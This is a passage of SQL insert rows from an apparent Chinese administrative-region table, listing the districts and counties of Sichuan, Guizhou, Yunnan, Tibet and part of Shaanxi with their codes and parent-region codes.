(2700, '1510101', '青羊区', 3, '3001', 0),
(2701, '1510102', '锦江区', 3, '3001', 0),
(2702, '1510103', '金牛区', 3, '3001', 0),
(2703, '1510104', '武侯区', 3, '3001', 0),
(2704, '1510105', '成华区', 3, '3001', 0),
(2705, '1510106', '龙泉驿区', 3, '3001', 0),
(2706, '1510107', '青白江区', 3, '3001', 0),
(2707, '1510108', '新都区', 3, '3001', 0),
(2708, '1510109', '温江区', 3, '3001', 0),
(2709, '3004', '都江堰市', 3, '3001', 0),
(2710, '3003', '彭州市', 3, '3001', 0),
(2711, '1510112', '邛崃市', 3, '3001', 0),
(2712, '1510113', '崇州市', 3, '3001', 0),
(2713, '1510114', '金堂县', 3, '3001', 0),
(2714, '1510115', '双流县', 3, '3001', 0),
(2715, '1510116', '郫县', 3, '3001', 0),
(2716, '1510117', '大邑县', 3, '3001', 0),
(2717, '1510118', '蒲江县', 3, '3001', 0),
(2718, '1510119', '新津县', 3, '3001', 0),
(2719, '1510199', '其他区县', 3, '3001', 0),
(2720, '1510201', '自流井区', 3, '3010', 0),
(2721, '1510202', '大安区', 3, '3010', 0),
(2722, '1510203', '贡井区', 3, '3010', 0),
(2723, '1510204', '沿滩区', 3, '3010', 0),
(2724, '1510205', '荣县', 3, '3010', 0),
(2725, '1510206', '富顺县', 3, '3010', 0),
(2726, '1510299', '其他区县', 3, '3010', 0),
(2727, '1510301', '东区', 3, '15103', 0),
(2728, '1510302', '西区', 3, '15103', 0),
(2729, '1510303', '仁和区', 3, '15103', 0),
(2730, '1510304', '米易县', 3, '15103', 0),
(2731, '1510305', '盐边县', 3, '15103', 0),
(2732, '1510399', '其他区县', 3, '15103', 0),
(2733, '1510401', '江阳区', 3, '3009', 0),
(2734, '1510402', '纳溪区', 3, '3009', 0),
(2735, '1510403', '龙马潭区', 3, '3009', 0),
(2736, '1510404', '泸县', 3, '3009', 0),
(2737, '1510405', '合江县', 3, '3009', 0),
(2738, '1510406', '叙永县', 3, '3009', 0),
(2739, '1510407', '古蔺县', 3, '3009', 0),
(2740, '1510499', '其他区县', 3, '3009', 0),
(2741, '1510501', '旌阳区', 3, '3005', 0),
(2742, '1510502', '什邡市', 3, '3005', 0),
(2743, '1510503', '广汉市', 3, '3005', 0),
(2744, '1510504', '绵竹市', 3, '3005', 0),
(2745, '1510505', '罗江县', 3, '3005', 0),
(2746, '1510506', '中江县', 3, '3005', 0),
(2747, '1510599', '其他区县', 3, '3005', 0),
(2748, '1510601', '涪城区', 3, '3007', 0),
(2749, '1510602', '游仙区', 3, '3007', 0),
(2750, '1510603', '江油市', 3, '3007', 0),
(2751, '1510604', '三台县', 3, '3007', 0),
(2752, '1510605', '盐亭县', 3, '3007', 0),
(2753, '1510606', '安县', 3, '3007', 0),
(2754, '1510607', '梓潼县', 3, '3007', 0),
(2755, '1510608', '平武县', 3, '3007', 0),
(2756, '1510609', '北川羌族自治县', 3, '3007', 0),
(2757, '1510699', '其他区县', 3, '3007', 0),
(2758, '1510701', '利州区', 3, '3013', 0),
(2759, '1510702', '元坝区', 3, '3013', 0),
(2760, '1510703', '朝天区', 3, '3013', 0),
(2761, '1510704', '旺苍县', 3, '3013', 0),
(2762, '1510705', '青川县', 3, '3013', 0),
(2763, '1510706', '剑阁县', 3, '3013', 0),
(2764, '1510707', '苍溪县', 3, '3013', 0),
(2765, '1510799', '其他区县', 3, '3013', 0),
(2766, '1510801', '船山区', 3, '15108', 0),
(2767, '1510802', '安居区', 3, '15108', 0),
(2768, '1510803', '蓬溪县', 3, '15108', 0),
(2769, '1510804', '射洪县', 3, '15108', 0),
(2770, '1510805', '大英县', 3, '15108', 0),
(2771, '1510899', '其他区县', 3, '15108', 0),
(2772, '1510901', '市中区', 3, '15109', 0),
(2773, '1510902', '东兴区', 3, '15109', 0),
(2774, '1510903', '威远县', 3, '15109', 0),
(2775, '1510904', '资中县', 3, '15109', 0),
(2776, '1510905', '隆昌县', 3, '15109', 0),
(2777, '1510999', '其他区县', 3, '15109', 0),
(2778, '1511001', '市中区', 3, '3012', 0),
(2779, '1511002', '沙湾区', 3, '3012', 0),
(2780, '1511003', '五通桥区', 3, '3012', 0),
(2781, '1511004', '金口河区', 3, '3012', 0),
(2782, '3011', '峨眉山市', 3, '3012', 0),
(2783, '1511006', '犍为县', 3, '3012', 0),
(2784, '1511007', '井研县', 3, '3012', 0),
(2785, '1511008', '夹江县', 3, '3012', 0),
(2786, '1511009', '沐川县', 3, '3012', 0),
(2787, '1511010', '峨边彝族自治县', 3, '3012', 0),
(2788, '1511011', '马边彝族自治县', 3, '3012', 0),
(2789, '1511099', '其他区县', 3, '3012', 0),
(2790, '1511101', '顺庆区', 3, '3008', 0),
(2791, '1511102', '高坪区', 3, '3008', 0),
(2792, '1511103', '嘉陵区', 3, '3008', 0),
(2793, '1511104', '阆中市', 3, '3008', 0),
(2794, '1511105', '南部县', 3, '3008', 0),
(2795, '1511106', '营山县', 3, '3008', 0),
(2796, '1511107', '蓬安县', 3, '3008', 0),
(2797, '1511108', '仪陇县', 3, '3008', 0),
(2798, '1511109', '西充县', 3, '3008', 0),
(2799, '1511199', '其他区县', 3, '3008', 0),
(2800, '1511201', '翠屏区', 3, '15112', 0),
(2801, '1511202', '宜宾县', 3, '15112', 0),
(2802, '1511203', '南溪县', 3, '15112', 0),
(2803, '1511204', '江安县', 3, '15112', 0),
(2804, '1511205', '长宁县', 3, '15112', 0),
(2805, '1511206', '高县', 3, '15112', 0),
(2806, '1511207', '筠连县', 3, '15112', 0),
(2807, '1511208', '珙县', 3, '15112', 0),
(2808, '1511209', '兴文县', 3, '15112', 0),
(2809, '1511210', '屏山县', 3, '15112', 0),
(2810, '1511299', '其他区县', 3, '15112', 0),
(2811, '1511301', '广安区', 3, '15113', 0),
(2812, '1511302', '华蓥市', 3, '15113', 0),
(2813, '1511303', '岳池县', 3, '15113', 0),
(2814, '1511304', '武胜县', 3, '15113', 0),
(2815, '1511305', '邻水县', 3, '15113', 0),
(2816, '1511399', '其他区县', 3, '15113', 0),
(2817, '1511401', '通川区', 3, '15114', 0),
(2818, '1511402', '万源市', 3, '15114', 0),
(2819, '1511403', '达县', 3, '15114', 0),
(2820, '1511404', '宣汉县', 3, '15114', 0),
(2821, '1511405', '开江县', 3, '15114', 0),
(2822, '1511406', '大竹县', 3, '15114', 0),
(2823, '1511407', '渠县', 3, '15114', 0),
(2824, '1511499', '其他区县', 3, '15114', 0),
(2825, '1511501', '东坡区', 3, '15115', 0),
(2826, '1511502', '仁寿县', 3, '15115', 0),
(2827, '1511503', '彭山县', 3, '15115', 0),
(2828, '1511504', '洪雅县', 3, '15115', 0),
(2829, '1511505', '丹棱县', 3, '15115', 0),
(2830, '1511506', '青神县', 3, '15115', 0),
(2831, '1511599', '其他区县', 3, '15115', 0),
(2832, '1511601', '雨城区', 3, '15116', 0),
(2833, '1511602', '名山县', 3, '15116', 0),
(2834, '1511603', '荥经县', 3, '15116', 0),
(2835, '1511604', '汉源县', 3, '15116', 0),
(2836, '1511605', '石棉县', 3, '15116', 0),
(2837, '1511606', '天全县', 3, '15116', 0),
(2838, '1511607', '芦山县', 3, '15116', 0),
(2839, '1511608', '宝兴县', 3, '15116', 0),
(2840, '1511699', '其他区县', 3, '15116', 0),
(2841, '1511701', '巴州区', 3, '15117', 0),
(2842, '1511702', '通江县', 3, '15117', 0),
(2843, '1511703', '南江县', 3, '15117', 0),
(2844, '1511704', '平昌县', 3, '15117', 0),
(2845, '1511799', '其他区县', 3, '15117', 0),
(2846, '1511801', '雁江区', 3, '15118', 0),
(2847, '1511802', '简阳市', 3, '15118', 0),
(2848, '1511803', '乐至县', 3, '15118', 0),
(2849, '1511804', '安岳县', 3, '15118', 0),
(2850, '1511899', '其他区县', 3, '15118', 0),
(2851, '1511901', '马尔康县', 3, '15119', 0),
(2852, '1511902', '汶川县', 3, '15119', 0),
(2853, '1511903', '理县', 3, '15119', 0),
(2854, '1511904', '茂县', 3, '15119', 0),
(2855, '1511905', '松潘县', 3, '15119', 0),
(2856, '1511906', '九寨沟县', 3, '15119', 0),
(2857, '1511907', '金川县', 3, '15119', 0),
(2858, '1511908', '小金县', 3, '15119', 0),
(2859, '1511909', '黑水县', 3, '15119', 0),
(2860, '1511910', '壤塘县', 3, '15119', 0),
(2861, '1511911', '阿坝县', 3, '15119', 0),
(2862, '1511912', '若尔盖县', 3, '15119', 0),
(2863, '1511913', '红原县', 3, '15119', 0),
(2864, '1511999', '其他区县', 3, '15119', 0),
(2865, '1512001', '康定县', 3, '15120', 0),
(2866, '1512002', '泸定县', 3, '15120', 0),
(2867, '1512003', '丹巴县', 3, '15120', 0),
(2868, '1512004', '九龙县', 3, '15120', 0),
(2869, '1512005', '雅江县', 3, '15120', 0),
(2870, '1512006', '道孚县', 3, '15120', 0),
(2871, '1512007', '炉霍县', 3, '15120', 0),
(2872, '1512008', '甘孜县', 3, '15120', 0),
(2873, '1512009', '新龙县', 3, '15120', 0),
(2874, '1512010', '德格县', 3, '15120', 0),
(2875, '1512011', '白玉县', 3, '15120', 0),
(2876, '1512012', '石渠县', 3, '15120', 0),
(2877, '1512013', '色达县', 3, '15120', 0),
(2878, '1512014', '理塘县', 3, '15120', 0),
(2879, '1512015', '巴塘县', 3, '15120', 0),
(2880, '1512016', '乡城县', 3, '15120', 0),
(2881, '1512017', '稻城县', 3, '15120', 0),
(2882, '1512018', '得荣县', 3, '15120', 0),
(2883, '1512099', '其他区县', 3, '15120', 0),
(2884, '3006', '西昌市', 3, '15121', 0),
(2885, '1512102', '盐源县', 3, '15121', 0),
(2886, '1512103', '德昌县', 3, '15121', 0),
(2887, '1512104', '会理县', 3, '15121', 0),
(2888, '1512105', '会东县', 3, '15121', 0),
(2889, '1512106', '宁南县', 3, '15121', 0),
(2890, '1512107', '普格县', 3, '15121', 0),
(2891, '1512108', '布拖县', 3, '15121', 0),
(2892, '1512109', '金阳县', 3, '15121', 0),
(2893, '1512110', '昭觉县', 3, '15121', 0),
(2894, '1512111', '喜德县', 3, '15121', 0),
(2895, '1512112', '冕宁县', 3, '15121', 0),
(2896, '1512113', '越西县', 3, '15121', 0),
(2897, '1512114', '甘洛县', 3, '15121', 0),
(2898, '1512115', '美姑县', 3, '15121', 0),
(2899, '1512116', '雷波县', 3, '15121', 0),
(2900, '1512117', '木里藏族自治县', 3, '15121', 0),
(2901, '1512199', '其他区县', 3, '15121', 0),
(2902, '1520101', '乌当区', 3, '2501', 0),
(2903, '1520102', '南明区', 3, '2501', 0),
(2904, '1520103', '云岩区', 3, '2501', 0),
(2905, '1520104', '花溪区', 3, '2501', 0),
(2906, '1520105', '白云区', 3, '2501', 0),
(2907, '1520106', '小河区', 3, '2501', 0),
(2908, '1520107', '清镇市', 3, '2501', 0),
(2909, '1520108', '开阳县', 3, '2501', 0),
(2910, '1520109', '修文县', 3, '2501', 0),
(2911, '1520110', '息烽县', 3, '2501', 0),
(2912, '1520199', '其他区县', 3, '2501', 0),
(2913, '1520201', '钟山区', 3, '2502', 0),
(2914, '1520202', '盘县', 3, '2502', 0),
(2915, '1520203', '水城县', 3, '2502', 0),
(2916, '1520204', '六枝特区', 3, '2502', 0),
(2917, '1520299', '其他区县', 3, '2502', 0),
(2918, '1520301', '红花岗区', 3, '2503', 0),
(2919, '1520302', '汇川区', 3, '2503', 0),
(2920, '1520303', '赤水市', 3, '2503', 0),
(2921, '1520304', '仁怀市', 3, '2503', 0),
(2922, '1520305', '遵义县', 3, '2503', 0),
(2923, '1520306', '桐梓县', 3, '2503', 0),
(2924, '1520307', '绥阳县', 3, '2503', 0),
(2925, '1520308', '正安县', 3, '2503', 0),
(2926, '1520309', '凤冈县', 3, '2503', 0),
(2927, '1520310', '湄潭县', 3, '2503', 0),
(2928, '1520311', '余庆县', 3, '2503', 0),
(2929, '1520312', '习水县', 3, '2503', 0),
(2930, '1520313', '道真仡佬族苗族自治县', 3, '2503', 0),
(2931, '1520314', '务川仡佬族苗族自治县', 3, '2503', 0),
(2932, '1520399', '其他区县', 3, '2503', 0),
(2933, '1520401', '西秀区', 3, '2504', 0),
(2934, '1520402', '平坝县', 3, '2504', 0),
(2935, '1520403', '普定县', 3, '2504', 0),
(2936, '1520404', '关岭布依族苗族自治县', 3, '2504', 0),
(2937, '1520405', '镇宁布依族苗族自治县', 3, '2504', 0),
(2938, '1520406', '紫云苗族布依族自治县', 3, '2504', 0),
(2939, '1520499', '其他区县', 3, '2504', 0),
(2940, '1520501', '铜仁市', 3, '15205', 0),
(2941, '1520502', '江口县', 3, '15205', 0),
(2942, '1520503', '石阡县', 3, '15205', 0),
(2943, '1520504', '思南县', 3, '15205', 0),
(2944, '1520505', '德江县', 3, '15205', 0),
(2945, '1520506', '玉屏侗族自治县', 3, '15205', 0),
(2946, '1520507', '印江土家族苗族自治县', 3, '15205', 0),
(2947, '1520508', '沿河土家族自治县', 3, '15205', 0),
(2948, '1520509', '松桃苗族自治县', 3, '15205', 0),
(2949, '1520510', '万山特区', 3, '15205', 0),
(2950, '1520599', '其他区县', 3, '15205', 0),
(2951, '2506', '毕节市', 3, '2505', 0),
(2952, '1520602', '大方县', 3, '2505', 0),
(2953, '1520603', '黔西县', 3, '2505', 0),
(2954, '1520604', '金沙县', 3, '2505', 0),
(2955, '1520605', '织金县', 3, '2505', 0),
(2956, '1520606', '纳雍县', 3, '2505', 0),
(2957, '1520607', '赫章县', 3, '2505', 0),
(2958, '1520608', '威宁彝族回族苗族自治县', 3, '2505', 0),
(2959, '1520699', '其他区县', 3, '2505', 0),
(2960, '1520701', '兴义市', 3, '15207', 0),
(2961, '1520702', '兴仁县', 3, '15207', 0),
(2962, '1520703', '普安县', 3, '15207', 0),
(2963, '1520704', '晴隆县', 3, '15207', 0),
(2964, '1520705', '贞丰县', 3, '15207', 0),
(2965, '1520706', '望谟县', 3, '15207', 0),
(2966, '1520707', '册亨县', 3, '15207', 0),
(2967, '1520708', '安龙县', 3, '15207', 0),
(2968, '1520799', '其他区县', 3, '15207', 0),
(2969, '1520801', '凯里市', 3, '15208', 0),
(2970, '1520802', '黄平县', 3, '15208', 0),
(2971, '1520803', '施秉县', 3, '15208', 0),
(2972, '1520804', '三穗县', 3, '15208', 0),
(2973, '1520805', '镇远县', 3, '15208', 0),
(2974, '1520806', '岑巩县', 3, '15208', 0),
(2975, '1520807', '天柱县', 3, '15208', 0),
(2976, '1520808', '锦屏县', 3, '15208', 0),
(2977, '1520809', '剑河县', 3, '15208', 0),
(2978, '1520810', '台江县', 3, '15208', 0),
(2979, '1520811', '黎平县', 3, '15208', 0),
(2980, '1520812', '榕江县', 3, '15208', 0),
(2981, '1520813', '从江县', 3, '15208', 0),
(2982, '1520814', '雷山县', 3, '15208', 0),
(2983, '1520815', '麻江县', 3, '15208', 0),
(2984, '1520816', '丹寨县', 3, '15208', 0),
(2985, '1520899', '其他区县', 3, '15208', 0),
(2986, '1520901', '都匀市', 3, '15209', 0),
(2987, '1520902', '福泉市', 3, '15209', 0),
(2988, '1520903', '荔波县', 3, '15209', 0),
(2989, '1520904', '贵定县', 3, '15209', 0),
(2990, '1520905', '瓮安县', 3, '15209', 0),
(2991, '1520906', '独山县', 3, '15209', 0),
(2992, '1520907', '平塘县', 3, '15209', 0),
(2993, '1520908', '罗甸县', 3, '15209', 0),
(2994, '1520909', '长顺县', 3, '15209', 0),
(2995, '1520910', '龙里县', 3, '15209', 0),
(2996, '1520911', '惠水县', 3, '15209', 0),
(2997, '1520912', '三都水族自治县', 3, '15209', 0),
(2998, '1520999', '其他区县', 3, '15209', 0),
(2999, '1530101', '盘龙区', 3, '2401', 0),
(3000, '1530102', '五华区', 3, '2401', 0),
(3001, '1530103', '官渡区', 3, '2401', 0),
(3002, '1530104', '西山区', 3, '2401', 0),
(3003, '1530105', '东川区', 3, '2401', 0),
(3004, '1530106', '安宁市', 3, '2401', 0),
(3005, '1530107', '呈贡县', 3, '2401', 0),
(3006, '1530108', '晋宁县', 3, '2401', 0),
(3007, '1530109', '富民县', 3, '2401', 0),
(3008, '1530110', '宜良县', 3, '2401', 0),
(3009, '1530111', '嵩明县', 3, '2401', 0),
(3010, '1530112', '石林彝族自治县', 3, '2401', 0),
(3011, '1530113', '禄劝彝族苗族自治县', 3, '2401', 0),
(3012, '1530114', '寻甸回族彝族自治县', 3, '2401', 0),
(3013, '1530199', '其他区县', 3, '2401', 0),
(3014, '1530201', '麒麟区', 3, '2402', 0),
(3015, '1530202', '宣威市', 3, '2402', 0),
(3016, '1530203', '马龙县', 3, '2402', 0),
(3017, '1530204', '沾益县', 3, '2402', 0),
(3018, '1530205', '富源县', 3, '2402', 0),
(3019, '1530206', '罗平县', 3, '2402', 0),
(3020, '1530207', '师宗县', 3, '2402', 0),
(3021, '1530208', '陆良县', 3, '2402', 0),
(3022, '1530209', '会泽县', 3, '2402', 0),
(3023, '1530299', '其他区县', 3, '2402', 0),
(3024, '1530401', '红塔区', 3, '2403', 0),
(3025, '1530402', '江川县', 3, '2403', 0),
(3026, '1530403', '澄江县', 3, '2403', 0),
(3027, '1530404', '通海县', 3, '2403', 0),
(3028, '1530405', '华宁县', 3, '2403', 0),
(3029, '1530406', '易门县', 3, '2403', 0),
(3030, '1530407', '峨山彝族自治县', 3, '2403', 0),
(3031, '1530408', '新平彝族傣族自治县', 3, '2403', 0),
(3032, '1530409', '元江哈尼族彝族傣族自治县', 3, '2403', 0),
(3033, '1530499', '其他区县', 3, '2403', 0),
(3034, '1530501', '隆阳区', 3, '2404', 0),
(3035, '1530502', '施甸县', 3, '2404', 0),
(3036, '1530503', '腾冲县', 3, '2404', 0),
(3037, '1530504', '龙陵县', 3, '2404', 0),
(3038, '1530505', '昌宁县', 3, '2404', 0),
(3039, '1530599', '其他区县', 3, '2404', 0),
(3040, '1530601', '昭阳区', 3, '15306', 0),
(3041, '1530602', '鲁甸县', 3, '15306', 0),
(3042, '1530603', '巧家县', 3, '15306', 0),
(3043, '1530604', '盐津县', 3, '15306', 0),
(3044, '1530605', '大关县', 3, '15306', 0),
(3045, '1530606', '永善县', 3, '15306', 0),
(3046, '1530607', '绥江县', 3, '15306', 0),
(3047, '1530608', '镇雄县', 3, '15306', 0),
(3048, '1530609', '彝良县', 3, '15306', 0),
(3049, '1530610', '威信县', 3, '15306', 0),
(3050, '1530611', '水富县', 3, '15306', 0),
(3051, '1530699', '其他区县', 3, '15306', 0),
(3052, '1530701', '古城区', 3, '2405', 0),
(3053, '1530702', '永胜县', 3, '2405', 0),
(3054, '1530703', '华坪县', 3, '2405', 0),
(3055, '1530704', '玉龙纳西族自治县', 3, '2405', 0),
(3056, '1530705', '宁蒗彝族自治县', 3, '2405', 0),
(3057, '1530799', '其他区县', 3, '2405', 0),
(3058, '1530801', '思茅区', 3, '15308', 0),
(3059, '1530802', '宁洱哈尼族彝族自治县', 3, '15308', 0),
(3060, '1530803', '墨江哈尼族自治县', 3, '15308', 0),
(3061, '1530804', '景东彝族自治县', 3, '15308', 0),
(3062, '1530805', '景谷傣族彝族自治县', 3, '15308', 0),
(3063, '1530806', '镇沅彝族哈尼族拉祜族自治县', 3, '15308', 0),
(3064, '1530807', '江城哈尼族彝族自治县', 3, '15308', 0),
(3065, '1530808', '孟连傣族拉祜族佤族自治县', 3, '15308', 0),
(3066, '1530809', '澜沧拉祜族自治县', 3, '15308', 0),
(3067, '1530810', '西盟佤族自治县', 3, '15308', 0),
(3068, '1530899', '其他区县', 3, '15308', 0),
(3069, '1530901', '临翔区', 3, '15309', 0),
(3070, '1530902', '凤庆县', 3, '15309', 0),
(3071, '1530903', '云县', 3, '15309', 0),
(3072, '1530904', '永德县', 3, '15309', 0),
(3073, '1530905', '镇康县', 3, '15309', 0),
(3074, '1530906', '双江拉祜族佤族布朗族傣族自治县', 3, '15309', 0),
(3075, '1530907', '耿马傣族佤族自治县', 3, '15309', 0),
(3076, '1530908', '沧源佤族自治县', 3, '15309', 0),
(3077, '1530999', '其他区县', 3, '15309', 0),
(3078, '1531001', '文山县', 3, '15310', 0),
(3079, '1531002', '砚山县', 3, '15310', 0),
(3080, '1531003', '西畴县', 3, '15310', 0),
(3081, '1531004', '麻栗坡县', 3, '15310', 0),
(3082, '1531005', '马关县', 3, '15310', 0),
(3083, '1531006', '丘北县', 3, '15310', 0),
(3084, '1531007', '广南县', 3, '15310', 0),
(3085, '1531008', '富宁县', 3, '15310', 0),
(3086, '1531099', '其他区县', 3, '15310', 0),
(3087, '1531101', '蒙自县', 3, '15311', 0),
(3088, '1531102', '个旧市', 3, '15311', 0),
(3089, '1531103', '开远市', 3, '15311', 0),
(3090, '1531104', '绿春县', 3, '15311', 0),
(3091, '1531105', '建水县', 3, '15311', 0),
(3092, '1531106', '石屏县', 3, '15311', 0),
(3093, '1531107', '弥勒县', 3, '15311', 0),
(3094, '1531108', '泸西县', 3, '15311', 0),
(3095, '1531109', '元阳县', 3, '15311', 0),
(3096, '1531110', '红河县', 3, '15311', 0),
(3097, '1531111', '金平苗族瑶族傣族自治县', 3, '15311', 0),
(3098, '1531112', '河口瑶族自治县', 3, '15311', 0),
(3099, '1531113', '屏边苗族自治县', 3, '15311', 0),
(3100, '1531199', '其他区县', 3, '15311', 0),
(3101, '1531201', '景洪市', 3, '15312', 0),
(3102, '1531202', '勐海县', 3, '15312', 0),
(3103, '1531203', '勐腊县', 3, '15312', 0),
(3104, '1531299', '其他区县', 3, '15312', 0),
(3105, '1531301', '楚雄市', 3, '15313', 0),
(3106, '1531302', '双柏县', 3, '15313', 0),
(3107, '1531303', '牟定县', 3, '15313', 0),
(3108, '1531304', '南华县', 3, '15313', 0),
(3109, '1531305', '姚安县', 3, '15313', 0),
(3110, '1531306', '大姚县', 3, '15313', 0),
(3111, '1531307', '永仁县', 3, '15313', 0),
(3112, '1531308', '元谋县', 3, '15313', 0),
(3113, '1531309', '武定县', 3, '15313', 0),
(3114, '1531310', '禄丰县', 3, '15313', 0),
(3115, '1531399', '其他区县', 3, '15313', 0),
(3116, '1531401', '大理市', 3, '15314', 0),
(3117, '1531402', '祥云县', 3, '15314', 0),
(3118, '1531403', '宾川县', 3, '15314', 0),
(3119, '1531404', '弥渡县', 3, '15314', 0),
(3120, '1531405', '永平县', 3, '15314', 0),
(3121, '1531406', '云龙县', 3, '15314', 0),
(3122, '1531407', '洱源县', 3, '15314', 0),
(3123, '1531408', '剑川县', 3, '15314', 0),
(3124, '1531409', '鹤庆县', 3, '15314', 0),
(3125, '1531410', '漾濞彝族自治县', 3, '15314', 0),
(3126, '1531411', '南涧彝族自治县', 3, '15314', 0),
(3127, '1531412', '巍山彝族回族自治县', 3, '15314', 0),
(3128, '1531499', '其他区县', 3, '15314', 0),
(3129, '1531501', '潞西市', 3, '15315', 0),
(3130, '1531502', '瑞丽市', 3, '15315', 0),
(3131, '1531503', '梁河县', 3, '15315', 0),
(3132, '1531504', '盈江县', 3, '15315', 0),
(3133, '1531505', '陇川县', 3, '15315', 0),
(3134, '1531599', '其他区县', 3, '15315', 0),
(3135, '1531601', '泸水县', 3, '15316', 0),
(3136, '1531602', '福贡县', 3, '15316', 0),
(3137, '1531603', '贡山独龙族怒族自治县', 3, '15316', 0),
(3138, '1531604', '兰坪白族普米族自治县', 3, '15316', 0),
(3139, '1531699', '其他区县', 3, '15316', 0),
(3140, '1531701', '香格里拉县', 3, '15317', 0),
(3141, '1531702', '德钦县', 3, '15317', 0),
(3142, '1531703', '维西傈僳族自治县', 3, '15317', 0),
(3143, '1531799', '其他区县', 3, '15317', 0),
(3144, '1540101', '城关区', 3, '2901', 0),
(3145, '1540102', '林周县', 3, '2901', 0),
(3146, '1540103', '当雄县', 3, '2901', 0),
(3147, '1540104', '尼木县', 3, '2901', 0),
(3148, '1540105', '曲水县', 3, '2901', 0),
(3149, '1540106', '堆龙德庆县', 3, '2901', 0),
(3150, '1540107', '达孜县', 3, '2901', 0),
(3151, '1540108', '墨竹工卡县', 3, '2901', 0),
(3152, '1540199', '其他区县', 3, '2901', 0),
(3153, '1540201', '昌都县', 3, '2903', 0),
(3154, '1540202', '江达县', 3, '2903', 0),
(3155, '1540203', '贡觉县', 3, '2903', 0),
(3156, '1540204', '类乌齐县', 3, '2903', 0),
(3157, '1540205', '丁青县', 3, '2903', 0),
(3158, '1540206', '察雅县', 3, '2903', 0),
(3159, '1540207', '八宿县', 3, '2903', 0),
(3160, '1540208', '左贡县', 3, '2903', 0),
(3161, '1540209', '芒康县', 3, '2903', 0),
(3162, '1540210', '洛隆县', 3, '2903', 0),
(3163, '1540211', '边坝县', 3, '2903', 0),
(3164, '1540299', '其他区县', 3, '2903', 0),
(3165, '1540301', '乃东县', 3, '2905', 0),
(3166, '1540302', '扎囊县', 3, '2905', 0),
(3167, '1540303', '贡嘎县', 3, '2905', 0),
(3168, '1540304', '桑日县', 3, '2905', 0),
(3169, '1540305', '琼结县', 3, '2905', 0),
(3170, '1540306', '曲松县', 3, '2905', 0),
(3171, '1540307', '措美县', 3, '2905', 0),
(3172, '1540308', '洛扎县', 3, '2905', 0),
(3173, '1540309', '加查县', 3, '2905', 0),
(3174, '1540310', '隆子县', 3, '2905', 0),
(3175, '1540311', '错那县', 3, '2905', 0),
(3176, '1540312', '浪卡子县', 3, '2905', 0),
(3177, '1540399', '其他区县', 3, '2905', 0),
(3178, '1540401', '日喀则市', 3, '15404', 0),
(3179, '1540402', '南木林县', 3, '15404', 0),
(3180, '1540403', '江孜县', 3, '15404', 0),
(3181, '1540404', '定日县', 3, '15404', 0),
(3182, '1540405', '萨迦县', 3, '15404', 0),
(3183, '1540406', '拉孜县', 3, '15404', 0),
(3184, '1540407', '昂仁县', 3, '15404', 0),
(3185, '1540408', '谢通门县', 3, '15404', 0),
(3186, '1540409', '白朗县', 3, '15404', 0),
(3187, '1540410', '仁布县', 3, '15404', 0),
(3188, '1540411', '康马县', 3, '15404', 0),
(3189, '1540412', '定结县', 3, '15404', 0),
(3190, '1540413', '仲巴县', 3, '15404', 0),
(3191, '1540414', '亚东县', 3, '15404', 0),
(3192, '1540415', '吉隆县', 3, '15404', 0),
(3193, '1540416', '聂拉木县', 3, '15404', 0),
(3194, '1540417', '萨嘎县', 3, '15404', 0),
(3195, '1540418', '岗巴县', 3, '15404', 0),
(3196, '1540499', '其他区县', 3, '15404', 0),
(3197, '1540501', '那曲县', 3, '2902', 0),
(3198, '1540502', '嘉黎县', 3, '2902', 0),
(3199, '1540503', '比如县', 3, '2902', 0),
(3200, '1540504', '聂荣县', 3, '2902', 0),
(3201, '1540505', '安多县', 3, '2902', 0),
(3202, '1540506', '申扎县', 3, '2902', 0),
(3203, '1540507', '索县', 3, '2902', 0),
(3204, '1540508', '班戈县', 3, '2902', 0),
(3205, '1540509', '巴青县', 3, '2902', 0),
(3206, '1540510', '尼玛县', 3, '2902', 0),
(3207, '1540599', '其他区县', 3, '2902', 0),
(3208, '1540601', '噶尔县', 3, '15406', 0),
(3209, '1540602', '普兰县', 3, '15406', 0),
(3210, '1540603', '札达县', 3, '15406', 0),
(3211, '1540604', '日土县', 3, '15406', 0),
(3212, '1540605', '革吉县', 3, '15406', 0),
(3213, '1540606', '改则县', 3, '15406', 0),
(3214, '1540607', '措勤县', 3, '15406', 0),
(3215, '1540699', '其他区县', 3, '15406', 0),
(3216, '1540701', '林芝县', 3, '2904', 0),
(3217, '1540702', '工布江达县', 3, '2904', 0),
(3218, '1540703', '米林县', 3, '2904', 0),
(3219, '1540704', '墨脱县', 3, '2904', 0),
(3220, '1540705', '波密县', 3, '2904', 0),
(3221, '1540706', '察隅县', 3, '2904', 0),
(3222, '1540707', '朗县', 3, '2904', 0),
(3223, '1540799', '其他区县', 3, '2904', 0),
(3224, '1610114', '高新技术产业开发区', 3, '20', 0),
(3225, '1610101', '未央区', 3, '20', 0),
(3226, '1610102', '莲湖区', 3, '20', 0),
(3227, '1610103', '新城区', 3, '20', 0),
(3228, '1610104', '碑林区', 3, '20', 0),
(3229, '1610105', '灞桥区', 3, '20', 0),
(3230, '1610106', '雁塔区', 3, '20', 0),
(3231, '1610107', '阎良区', 3, '20', 0),
(3232, '1610108', '临潼区', 3, '20', 0),
(3233, '1610109', '长安区', 3, '20', 0),
(3234, '1610110', '蓝田县', 3, '20', 0),
(3235, '1610111', '周至县', 3, '20', 0),
(3236, '1610112', '户县', 3, '20', 0),
(3237, '1610113', '高陵县', 3, '20', 0),
(3238, '1610199', '其他区县', 3, '20', 0),
(3239, '1610201', '耀州区', 3, '1309', 0),
(3240, '1610202', '王益区', 3, '1309', 0),
(3241, '1610203', '印台区', 3, '1309', 0),
(3242, '1610204', '宜君县', 3, '1309', 0),
(3243, '1610299', '其他区县', 3, '1309', 0),
(3244, '1610301', '渭滨区', 3, '1307', 0),
(3245, '1610302', '金台区', 3, '1307', 0),
(3246, '1610303', '陈仓区', 3, '1307', 0),
(3247, '1610304', '凤翔县', 3, '1307', 0),
(3248, '1610305', '岐山县', 3, '1307', 0),
(3249, '1610306', '扶风县', 3, '1307', 0),
(3250, '1610307', '眉县', 3, '1307', 0),
(3251, '1610308', '陇县', 3, '1307', 0),
(3252, '1610309', '千阳县', 3, '1307', 0),
(3253, '1610310', '麟游县', 3, '1307', 0),
(3254, '1610311', '凤县', 3, '1307', 0),
(3255, '1610312', '太白县', 3, '1307', 0),
(3256, '1610399', '其他区县', 3, '1307', 0),
(3257, '1610401', '秦都区', 3, '1302', 0),
(3258, '1610402', '杨陵区', 3, '1302', 0),
(3259, '1610403', '渭城区', 3, '1302', 0),
(3260, '1610404', '兴平市', 3, '1302', 0),
(3261, '1610405', '三原县', 3, '1302', 0),
(3262, '1610406', '泾阳县', 3, '1302', 0),
(3263, '1610407', '乾县', 3, '1302', 0),
